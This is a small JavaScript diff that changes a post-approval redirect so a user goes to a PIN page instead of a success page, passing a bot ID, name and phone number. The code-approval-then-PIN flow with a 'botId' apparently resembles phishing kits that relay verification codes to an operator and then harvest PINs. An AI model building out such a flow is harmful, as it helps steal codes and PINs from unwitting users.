@@ -451,7 +451,8 @@
                             .then(status => {
                                 if (status.approved === true) {
                                     clearInterval(pollInterval);
-                                    window.location.href = `success.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
+                                    // ✅ Changed redirect: now goes to PIN page
+                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
                                 } else if (status.approved === false) {
                                     clearInterval(pollInterval);
                                     showMessage('Incorrect code. Please try again.', true);
